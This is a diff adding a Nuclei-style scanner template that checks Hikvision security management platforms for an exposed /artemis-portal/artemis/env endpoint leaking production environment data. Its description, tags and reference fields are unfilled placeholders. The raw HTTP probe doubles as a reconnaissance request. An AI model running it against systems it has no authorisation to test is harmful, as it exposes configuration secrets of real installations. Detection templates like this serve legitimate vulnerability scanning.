@@ -1,0 +1,31 @@
+id: HIKVISION-env-InformationLeakage
+
+info:
+  name: 海康威视综合安防管理平台env信息泄露
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /artemis-portal/artemis/env HTTP/1.1
+        Host: {{Hostname}}
+        User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.4) Gecko/20100503 Firefox/3.6.4 (.NET CLR 3.5.30729)
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"profiles":["prod"]'
+      - type: status
+        status:
+          - 200
